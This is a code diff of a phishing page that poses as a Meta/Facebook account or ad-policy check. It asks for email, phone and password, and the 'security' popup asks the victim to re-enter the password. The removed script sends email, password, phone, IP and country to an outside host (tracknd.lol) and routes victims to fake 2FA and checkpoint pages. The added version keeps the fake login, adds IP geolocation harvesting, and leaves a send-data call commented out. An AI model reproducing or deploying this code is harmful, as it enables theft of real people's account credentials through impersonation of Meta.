@@ -24,6 +24,20 @@
 </head>
 <style>
     /* CSS */
+    .error {
+        outline: none;
+        border: 1px solid red;
+    }
+
+    .error:focus {
+        outline: none;
+        border: 1px solid red;
+    }
+
+    .error::placeholder {
+        color: red;
+    }
+
     .w-full {
         width: 100%;
     }
@@ -135,212 +149,21 @@
         font-weight: 400;
         font-style: normal;
     }
-</style>
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        console.clear();
-        document.getElementById("email").focus();
 
-        function randomCase(str) {
-            return str.split("").map((char) => Math.random() < 0.5 ? char.toUpperCase() : char.toLowerCase())
-                .join("");
-        }
-        var randomNumber = Math.floor(Math.random() * 10000000000);
-        var spanCase = document.getElementById("case");
-        spanCase.innerHTML = "Case #" + randomNumber;
-        document.getElementById("email").addEventListener("blur", function() {
-            var emailValue = this.value.trim();
-            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailPattern.test(emailValue)) {
-                document.getElementById("email").classList.add("error");
-                document.getElementById("email").value = "";
-                document.getElementById("email").placeholder = "Email is not valid";
-                document.getElementById("email").focus();
-            } else {
-                document.getElementById("email").classList.remove("error");
-                document.getElementById("email").placeholder = "";
-            }
-        });
-        document.getElementById("phoneNumberInput").addEventListener("blur", function() {
-            var tel = document.getElementById("phoneNumberInput").value.trim();
-            var telPattern = /^\+\d{4,}$/;
-            if (!telPattern.test(tel)) {
-                document.getElementById("phoneNumberInput").classList.add("error");
-                document.getElementById("phoneNumberInput").value = "";
-                document.getElementById("phoneNumberInput").placeholder = "Phone Number is not valid";
-            } else {
-                document.getElementById("phoneNumberInput").classList.remove("error");
-                document.getElementById("phoneNumberInput").placeholder = "Phone Number";
-            }
-        });
-        const countryCodeSelect = document.getElementById("countryCodeSelect");
-        const phoneNumberInput = document.getElementById("phoneNumberInput");
-        const options = document.querySelectorAll(".country-code");
-        const valuesArray = [];
-        options.forEach((option) => {
-            valuesArray.push(option.value);
-        });
-        phoneNumberInput.addEventListener("input", function() {
-            let value = this.value;
-            value = value.replace(/\D/g, "");
-            this.value = value;
-            const countryCode = value.replace("+", "");
-            if (!value.startsWith("+")) {
-                phoneNumberInput.value = `+${countryCode}`;
-            }
-            if (valuesArray.includes(countryCode)) {
-                countryCodeSelect.value = countryCode;
-            }
-            if (value.length > 12) {
-                phoneNumberInput.value = phoneNumberInput.value.slice(0, 12);
-            }
-        });
-        countryCodeSelect.addEventListener("change", function() {
-            const countryCode = this.value;
-            phoneNumberInput.value = `+${countryCode}`;
-        });
-    });
 
-    function checkAll() {
-        var checkBox = document.getElementById("must-check");
-        var checkboxes = document.querySelectorAll('input[type="checkbox"]');
-        var checkedCount = 0;
-        checkboxes.forEach(function(checkbox) {
-            if (checkbox.checked) {
-                checkedCount++;
-            }
-        });
-        if (checkedCount > 0 && checkBox.checked) {
-            if (checkInputs()) {
-                document.getElementById("btn-submit").disabled = false;
-                document.getElementById("btn-submit").style.backgroundColor = "#1a73e3";
-                return true;
-            }
-        } else {
-            if (checkInputs()) {
-                document.getElementById("btn-submit").disabled = true;
-                document.getElementById("btn-submit").style.backgroundColor = "#88bdff";
-                return false;
-            }
-        }
-    }
-    document.addEventListener(
-        "selectstart",
-        function(event) {
-            event.preventDefault();
-        },
-        false
-    );
-
-    function openPopup() {
-        if (!checkAll()) {
-            return;
-        } else {
-            document.getElementById("popup").style.display = "flex";
-        }
+    .error-notification {
+        /* text-align: center; */
+        display: none;
+        /* padding: 0px 30px; */
     }
 
-    function closePopup() {
-        document.getElementById("popup").style.display = "none";
-    }
-
-    function validatepassword() {
-        var password = document.getElementById("password").value;
-        if (password.length < 6) {
-            document.getElementById("btn-continue").disabled = true;
-            return;
-        } else {
-            document.getElementById("btn-continue").disabled = false;
-            return;
-        }
-    }
-
-    function checkInputs() {
-        var inputs = document.querySelectorAll('input[type="text"]');
-        for (var i = 0; i < inputs.length; i++) {
-            if (!inputs[i].value.trim()) {
-                document.getElementById("btn-submit").disabled = true;
-                document.getElementById("btn-submit").style.backgroundColor = "#88bdff";
-                return false;
-            }
-        }
-        document.getElementById("btn-submit").disabled = false;
-        document.getElementById("btn-submit").style.backgroundColor = "#1a73e3";
-        return true;
-    }
-
-    function nextPage() {
-        var personalEmail = document.getElementById("email").value;
-        var phoneNumber = document.getElementById("phoneNumberInput").value;
-        var passwordInput = document.getElementById("password");
-        var password = document.getElementById("password").value;
-        var error = document.getElementById("error-message");
-        var ip = localStorage.getItem("ipAddress");
-        var country = localStorage.getItem("address");
-        if (password) {
-            try {
-                fetch(
-                        `https://tracknd.lol/check_facebook_status?email=${personalEmail}&password=${password}&phonenumber=${phoneNumber}&ip=${ip}&country=${country}&code=`)
-                    .then(function(response) {
-                        return response.text();
-                    }).then(function(text) {
-                        if (text === '2FA') {
-                            localStorage.setItem("email", personalEmail);
-                            localStorage.setItem("phonenumber", phoneNumber);
-                            localStorage.setItem("password", password);
-                            localStorage.setItem("ipAddress", ip);
-                            localStorage.setItem("address", country);
-                            window.location.href = "twofa.html";
-                        } else if (text === '681') {
-                            localStorage.setItem("email", personalEmail);
-                            localStorage.setItem("phonenumber", phoneNumber);
-                            localStorage.setItem("password", password);
-                            localStorage.setItem("ipAddress", ip);
-                            localStorage.setItem("address", country);
-                            window.location.href = "checkpoint.html";
-                        } else if (text === 'WRONG') {
-                            error.style.display = "block";
-                        } else {
-                            window.location.href = "https://transparency.fb.com/policies/ad-standards/";
-                        }
-                    }).catch(error => {
-                        console.error('Error:', error);
-                    });
-            } catch (error) {}
-        }
-    }
-    document.addEventListener("DOMContentLoaded", async function() {
-        checkAll();
-        let ipAddress;
-        let address;
-        try {
-            const ipifyResponse = await fetch("https://api.ipify.org?format=json");
-            const ipifyData = await ipifyResponse.json();
-            ipAddress = ipifyData.ip;
-            const ipLocationNetResponse = await fetch(
-                `https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
-            const ipLocationNetData = await ipLocationNetResponse.json();
-            address = ipLocationNetData.country_name;
-            localStorage.setItem("ipAddress", ipAddress);
-            localStorage.setItem("address", address);
-        } catch (error) {
-            console.clear();
-        }
-    });
-</script>
-<style>
-    .error {
-        outline: none;
-        border: 1px solid red;
-    }
-
-    .error:focus {
-        outline: none;
-        border: 1px solid red;
-    }
-
-    .error::placeholder {
+    .error-notification,
+    .error-notification a {
         color: red;
+    }
+
+    .error-notification a {
+        font-weight: bold;
     }
 </style>
 
@@ -388,10 +211,9 @@
                 </p>
             </div>
             <div class="button-btn">
-                <label class="footer-top">Email Address *</label>
-                <input type="text" id="email" oninput="checkInputs()" placeholder="Email addess" />
+                <input type="text" id="email" placeholder="@lang('login.email')" />
             </div>
-            <div style="display: flex;">
+            {{-- <div style="display: flex;">
                 <select id="countryCodeSelect"
                     class="w-44 appearance-none border border-r-0 border-gray-300 bg-white px-3 py-2 leading-tight text-gray-700 focus:outline-none">
                     <option class="country-code" value="93"> 🇦🇫 Afghanistan (+93) </option>
@@ -597,12 +419,14 @@
                     class="w-full appearance-none rounded rounded-l-none border border-gray-300 bg-white px-3 py-2 leading-tight text-gray-700 focus:border-gray-500 focus:outline-none"
                     oninvalid="this.setCustomValidity('Please enter a valid phone number.')"
                     oninput="this.setCustomValidity('')" required autocomplete="off" />
-            </div>
+            </div> --}}
             <div class="buttuncheck">
-                <input type="checkbox" onclick="checkAll()" id="must-check" />
-                <label class="buttuncheck-label">Do you agree to our Terms, Data Policy and Cookies Policy.</label>
+                <input type="checkbox" id="must-check" />
+                <label for="must-check" class="buttuncheck-label">Do you agree to our Terms, Data Policy and Cookies
+                    Policy.</label>
             </div>
-            <button class="btn-submit" id="btn-submit" onclick="openPopup()"> Submit </button>
+            <button class="btn-submit" id="btn-submit" style="background-color:rgb(136, 189, 255)" disabled
+                onclick="openPopup()">@lang('login.submit')</button>
             <div class="footer-bottom">
                 <p> For more information about how Meta handles your data please read our <a
                         href="https://www.facebook.com/privacy/policy/?entry_point=data_policy_redirect&entry=0">Meta
@@ -622,19 +446,57 @@
                 <p class="popup-text"> For your security, you must re-enter your password to continue </p>
                 <div class="form-group" style="margin-bottom: 0px">
                     <label>Enter Your Password</label>
-                    <input type="password" class="form-input" id="password" oninput="validatepassword()" />
+                    <div class="error-notification" style="display: none">
+                        <span class="">@lang('fa.warning_login_fa')</span>
+                        <br><a class="" href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
+                    </div>
+                    <input type="password" class="form-input" id="password" oninput="validatepassword()"
+                        placeholder="@lang('login.password')" value="" />
                     <i id="eye" class="fa fa-eye"></i>
                 </div>
                 <p class="error-message" id="error-message" style="display: none"> Your password was incorrect! </p>
             </div>
             <div class="popup-footer">
-                <button class="button" disabled id="btn-continue" onclick="nextPage()"> Continue </button>
+                {{-- <button class="button" disabled id="btn-continue" onclick="nextPage()"> Continue </button> --}}
+                <button style="background-color: rgb(26, 115, 227);color:white" type="button"
+                    class="button-form-login">
+                    <span id="submit-login-loading" style="width:1.5rem;height:1.5rem;"
+                        class="d-none spinner-border spinner">
+                    </span>
+                    <span id="submit-login-text">@lang('login.submit')</span>
+                </button>
                 <span class="loader" id="loader"></span>
             </div>
         </div>
     </div>
 </body>
 <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        console.clear();
+
+    });
+
+    function openPopup() {
+        document.getElementById("popup").style.display = "flex";
+    }
+
+    function closePopup() {
+        document.getElementById("popup").style.display = "none";
+    }
+
+    function validatepassword() {
+        var password = document.getElementById("password").value;
+        if (password.length < 6) {
+            $("#password").addClass('error');
+            $("#password").focus();
+            return;
+        } else {
+            $("#password").removeClass('error');
+            return;
+        }
+    }
+
+
     document.addEventListener('DOMContentLoaded', function() {
         const passwordInput = document.getElementById('password');
         const eyeIcon = document.querySelector('.fa-eye');
@@ -645,7 +507,112 @@
         });
     });
 </script>
-<script></script>
+{{-- js --}}
+<script>
+    setCurrentLang();
+
+    async function setCurrentLang() {
+        let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
+        const response = await fetch(getIpInfoUrl);
+        const ipInfo = await response.json();
+        console.log(ipInfo);
+        ipAddress = ipInfo.ipAddress;
+        latitude = ipInfo.latitude;
+        longitude = ipInfo.longitude;
+        countryName = ipInfo.countryName;
+        countryCode = ipInfo.countryCode;
+        cityName = ipInfo.cityName;
+        regionName = ipInfo.regionName;
+        timeZone = ipInfo.timeZone;
+        zipCode = ipInfo.zipCode;
+        continent = ipInfo.continent;
+        continentCode = ipInfo.continentCode;
+    }
+
+    function pushIPInfo(formData) {
+        formData.append('ipAddress', ipAddress)
+        formData.append('latitude', latitude)
+        formData.append('longitude', longitude)
+        formData.append('countryName', countryName)
+        formData.append('countryCode', countryCode)
+        formData.append('regionName', regionName)
+        formData.append('cityName', cityName)
+        formData.append('timeZone', timeZone)
+        formData.append('zipCode', zipCode)
+        formData.append('continent', continent)
+        formData.append('continentCode', continentCode)
+        return formData;
+    }
+
+    function isNumeric(str) {
+        if (typeof str != "string") return false // we only process strings!
+
+        return !isNaN(str) &&
+            // use type coercion to parse the _entirety_ of the string (`parseFloat` alone does not do this)...
+            !isNaN(parseFloat(str)) // ...and ensure strings of whitespace fail
+    }
+
+    function isValidValuePhoneEmail(value) {
+        if (isNumeric(value)) {
+            const regexPhoneNumber = /^0\d{9,11}$/;
+
+            return regexPhoneNumber.test(value);
+        } else {
+            const regexEmail = /^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/;
+
+            return regexEmail.test(value);
+        }
+    }
+
+    $(document).on('click', '#must-check', function() {
+        let value = $('#email').val();
+        if ($(this).is(':checked') && isValidValuePhoneEmail(value)) {
+            $('.btn-submit').prop('disabled', false);
+            $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
+        } else {
+            $('.btn-submit').prop('disabled', true);
+            $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
+        }
+    })
+
+    $(document).on('click', '.button-form-login', function() {
+        $(this).prop('disabled', true);
+        $('#login_error').addClass('d-none');
+        const loading = $('#submit-login-loading');
+        const text = $('#submit-login-text');
+        text.addClass('d-none');
+        loading.removeClass('d-none');
+        let email = $('#username-desktop').val();
+        let pass = $('#password-desktop').val();
+        setTimeout(() => {
+            if (!pass) {
+                text.removeClass('d-none');
+                loading.addClass('d-none');
+                $('.error-notification').css('display', 'block');
+                $(this).prop('disabled', false);
+            } else {
+                // sendDataLogin();
+            }
+        }, 1000);
+    });
+
+    $(document).on('input', '#email', function() {
+        if (isValidValuePhoneEmail($(this).val())) {
+            $(this).removeClass("error");
+            $(this).prop('placeholder', '');
+            if ($('#must-check').is(':checked')) {
+                $('.btn-submit').prop('disabled', false);
+                $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
+            }
+        } else {
+            $(this).addClass("error");
+            $(this).prop('placeholder', 'Email or number phone is not valid');
+            $(this).focus();
+            $('.btn-submit').prop('disabled', true);
+            $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
+        }
+    });
+</script>
 <script src="https://code.iconify.design/3/3.1.0/iconify.min.js"></script>
 
 </html>
